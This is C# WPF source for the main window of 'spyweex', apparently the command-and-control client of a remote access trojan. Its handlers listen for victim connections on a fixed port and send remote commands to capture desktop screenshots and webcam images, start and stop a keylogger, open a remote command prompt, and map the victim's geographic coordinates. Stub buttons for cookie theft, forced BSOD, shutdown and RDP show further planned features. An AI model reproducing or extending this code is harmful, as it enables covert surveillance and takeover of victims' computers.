using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Markup;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Windows.Threading;
using spyweex_client_wpf.StaticStrings;
using spyweex_client_wpf.Subscribers;


namespace spyweex_client_wpf
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {

        /// <summary>
        /// sessions source for listview.
        /// </summary>

        private WxhtpServiceServer _wxhtpServiceServer;

        public ViewModel ViewModelSession;
        CancellationTokenSource cts = new CancellationTokenSource();
        CancellationToken ct;

        public delegate void updateCmdTextBoxDelegate(string cmd, string response);
        public updateCmdTextBoxDelegate updateCmdTextBox;

        ConnectionListener connectionListener;
        ConnectionInfoListener connInfoListener;

        public MainWindow()
        {
            ViewModelSession = new ViewModel();
            DataContext = ViewModelSession;
            InitializeComponent();

            connectionListener = new ConnectionListener();
            connInfoListener = new ConnectionInfoListener();

        }


        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            SessionListView.ItemsSource = ((ViewModel)DataContext).sessions;
        }

        //public async Task UpdateIncomingWithDelay()
        //{
        //    await Task.Delay(5000);
        //    ((ViewModel)DataContext).sessions[0].Incoming = 25;
        //}

        private async void btnStart_Clicked(object sender, RoutedEventArgs e)
        {
            if (_wxhtpServiceServer != null)
            {
                _wxhtpServiceServer.Stop();
                _wxhtpServiceServer = null;
            }
            _wxhtpServiceServer = new WxhtpServiceServer(Utils.GetAllLocalIPv4(NetworkInterfaceType.Wireless80211).FirstOrDefault(), 56432, ViewModelSession);
            _wxhtpServiceServer.Start();
            connectionListener.Subscribe(connInfoListener, ViewModelSession, _wxhtpServiceServer);

            LabelAppStatus.Content = "Server started";

            await _wxhtpServiceServer.Run();
        }

        private void btnStop_Clicked(object sender, RoutedEventArgs e)
        {
            try
            {
                //var stopTask = _wxhtpServiceServer?.Stop();
                //if (stopTask != null) await stopTask;
                if(connectionListener.isSubscribed)
                    connectionListener.UnsubscribeAsync();
                _wxhtpServiceServer?.Stop();
                _wxhtpServiceServer = null;
                

                LabelAppStatus.Content = string.Format("Server stopped");
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Exception in btnStop " + ex);
            }
        }

        private void btnCancel_Clicked(object sender, RoutedEventArgs e)
        {
            cts?.Cancel();
        }

        private void btnIP_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private async void btnDesktopScreen_Clicked(object sender, RoutedEventArgs e)
        {

            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
            WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);

            if (wxhtpClient.isDesktopScreenListenerSubscribed()) return;
            try
            {
                ct = cts.Token;
                await wxhtpClient.ExecuteTask(
                    ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.TAKE_DESKTOP_SCREEN, PARAM_TYPES.number + "1");
                wxhtpClient.DesktopScreenListenerSubscribe();

            }
            catch (ArgumentNullException ex)
            {
                Debug.Write(ex.Message);
            }
            catch (TaskCanceledException tce)
            {
                Debug.Write("Task was canceled " + tce.Message);
            }
        }

        private async void btnWebcamScreen_Clicked(object sender, RoutedEventArgs e)
        {
            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
            WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
            if (wxhtpClient.isWebCamPicListenerSubscribed()) return;
            try
            {
                ct = cts.Token;
                await wxhtpClient.ExecuteTask(
                    ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.TAKE_WEBCAM_SCREEN, PARAM_TYPES.number + "1");
                wxhtpClient.WebCamPicListenerSubscribe();
            }
            catch (ArgumentNullException ex)
            {
                Debug.Write(ex.Message);
            }
            catch (TaskCanceledException tce)
            {
                Debug.Write("Task was canceled " + tce.Message);
            }
        }

        private void btnAddUser_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnRemoveUser_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnCmdPrompt_Clicked(object sender, RoutedEventArgs e)
        {
            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
            WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
            if (wxhtpClient.isConsoleAttached) return;
            try
            {
                ct = cts.Token;
                var consoleWindow = new Console(wxhtpClient, _wxhtpServiceServer, ct) {Owner = this};
                consoleWindow.Show();
                wxhtpClient.isConsoleAttached = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show("Exception in creating console: \n{0}", ex.ToString());
            }

        }

        private async void btnKeyLogger_Clicked(object sender, RoutedEventArgs e)
        {
            IPEndPoint currentIpEndPoint = Utils.ParseIPEndpoint(((ViewModel)DataContext).SelectedSession.WANIP);
            WxhtpClient wxhtpClient = _wxhtpServiceServer.TryGetClientByIpEndpoint(currentIpEndPoint);
            if (wxhtpClient.isKeyloggerListenerSubscribed())
            {
                MessageBoxResult result = MessageBox.Show("Keylogger already running. Do you want to stop it?", "Confirmation", MessageBoxButton.YesNo, MessageBoxImage.Question);
                if (result == MessageBoxResult.Yes)
                {
                    // runs the task to send message stop
                    ct = cts.Token;
                    await wxhtpClient.ExecuteTask(
                        ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.KEYLOGGER_STOP, PARAM_TYPES.number + "1");
                    return;
                    // shouldn't unsubscribe - because of i want to receive last info gained when remote timer elapses
                    //wxhtpClient.KeyloggerListenerUnSubscribe();
                }
                else
                {
                    return;
                }
            }
            try
            {
                ct = cts.Token;
                await wxhtpClient.ExecuteTask(
                    ct, wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(), METHOD_TYPE.GET, ACTION_TYPE.KEYLOGGER_START, PARAM_TYPES.number + "1");
                wxhtpClient.KeyloggerListenerSubscribe();
            }
            catch (ArgumentNullException ex)
            {
                Debug.Write(ex.Message);
            }
            catch (TaskCanceledException tce)
            {
                Debug.Write("Task was canceled " + tce.Message);
            }
            
        }

        private void btnTaskList_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnDownload_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnRDP_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnShutdown_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnCookies_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnGeo_Clicked(object sender, RoutedEventArgs e)
        {
            string coords = ((ViewModel) DataContext).SelectedSession.Coords;
            string geo_uri = string.Format("https://www.google.ru/maps/place/{0},{1}/", coords.Split(',')[0], coords.Split(',')[1]);
            System.Diagnostics.Process.Start(geo_uri);
        }

        private void btnTelnet_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnBsod_Clicked(object sender, RoutedEventArgs e)
        {

        }

        private void btnReboot_Clicked(object sender, RoutedEventArgs e)
        {

        }

    }
}

namespace MyApp.Tools
{

    [ValueConversion(typeof(string), typeof(string))]
    public class RatioConverter : MarkupExtension, IValueConverter
    {
        private static RatioConverter _instance;

        public RatioConverter() { }

        public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
        { // do not let the culture default to local to prevent variable outcome re decimal syntax
            double size = System.Convert.ToDouble(value) * System.Convert.ToDouble(parameter, CultureInfo.InvariantCulture);
            return size.ToString("G0", CultureInfo.InvariantCulture);
        }

        public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
        { // read only converter...
            throw new NotImplementedException();
        }

        public override object ProvideValue(IServiceProvider serviceProvider)
        {
            return _instance ?? (_instance = new RatioConverter());
        }

    }
}